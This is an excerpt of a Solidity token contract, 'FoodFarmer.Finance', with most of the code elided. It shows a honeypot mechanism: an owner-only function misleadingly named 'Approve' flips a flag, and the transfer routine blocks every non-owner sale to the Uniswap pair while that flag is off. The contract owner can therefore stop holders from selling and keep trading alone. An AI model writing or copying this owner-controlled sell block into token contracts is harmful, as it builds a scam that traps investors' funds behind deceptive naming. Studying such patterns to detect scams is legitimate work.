...
contract FoodFarmer is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"FoodFarmer.Finance";
    ...
    address payable private _FeeAddress = payable(0x306B45e88918AEffAF1386cb22aB893Bbebecbb3);
    address payable private _marketingWalletAddress = payable(0x306B45e88918AEffAF1386cb22aB893Bbebecbb3);
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;

    bool private isApproved = true;
    ...
    function Approve(bool status) external onlyOwner {
        isApproved = status;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(from != owner() && to != owner()) {
            ...
            if (to == uniswapV2Pair) {
                require(isApproved, "Trading not yet enabled");
            }
